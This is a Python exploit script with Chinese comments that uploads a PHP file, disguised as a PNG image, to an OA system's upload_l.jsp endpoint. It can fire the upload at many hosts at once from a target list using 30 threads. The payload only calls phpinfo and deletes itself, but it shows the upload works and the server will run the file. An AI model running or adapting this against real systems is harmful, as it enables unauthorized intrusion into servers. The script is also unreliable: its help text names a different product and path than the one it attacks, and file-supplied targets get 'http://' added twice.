import requests
import sys
import argparse
from multiprocessing.dummy import Pool

def send_request(host):
    url = f"http://{host}/jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1"  # 替换为实际的目标主机
    boundary = '---------------------------289666258334735365651210512949'
    body = (
            '--' + boundary + '\r\n'
                              'Content-Disposition: form-data; name="file1"; filename="2.php"\r\n'
                              'Content-Type: image/png\r\n\r\n'
                              '<?php phpinfo();unlink(__FILE__);?>\r\n'
                              '--' + boundary + '--\r\n'
    )
    headers = {
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': str(len(body))  # 确保内容长度正确
}



    try:
    # 发送POST请求
        response = requests.post(url, headers=headers, data=body)

    # 输出响应内容
        print("Response Code:", response.status_code)
        print("Response Body:", response.text)

    except requests.exceptions.RequestException as e:
         print("An error occurred:", e)

def main():
    parse = argparse.ArgumentParser(description="百易云资产管理运营系统mobilefront/c/2.php任意文件上传漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)

    try:
        targets = []
        if args.url:
            send_request(args.url)
        elif args.file:
            with open(args.file, 'r') as f:
                for target in f.readlines():
                    target = target.strip()
                    if target:  # 确保不添加空行
                        # 增加协议
                        if not target.startswith(('http://', 'https://')):
                            target = 'http://' + target
                        targets.append(target)

        # 调用多线程去执行检测函数
        pool.map(send_request, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息: {e}")
if __name__ == '__main__':
    main()